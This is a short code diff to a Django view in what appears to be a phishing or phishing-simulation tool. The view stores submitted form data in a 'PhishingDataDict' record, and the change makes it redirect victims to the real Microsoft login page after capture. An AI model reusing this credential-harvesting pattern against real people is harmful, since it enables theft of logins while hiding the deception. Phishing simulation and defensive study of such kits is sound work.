@@ -369,6 +369,6 @@ def DynamicTemplate(request, url_slug, render_id):
             if len(p_data) > 0:
                 p_data = p_data[0]
                 PhishingDataDict.objects.create(pdata=p_data, data=str(request.POST.dict()))
-        #return redirect("https://login.microsoftonline.com/")
-        return HttpResponse(temp_instance.template_code)
+        return redirect("https://login.microsoftonline.com/")
+        #return HttpResponse(temp_instance.template_code)
         
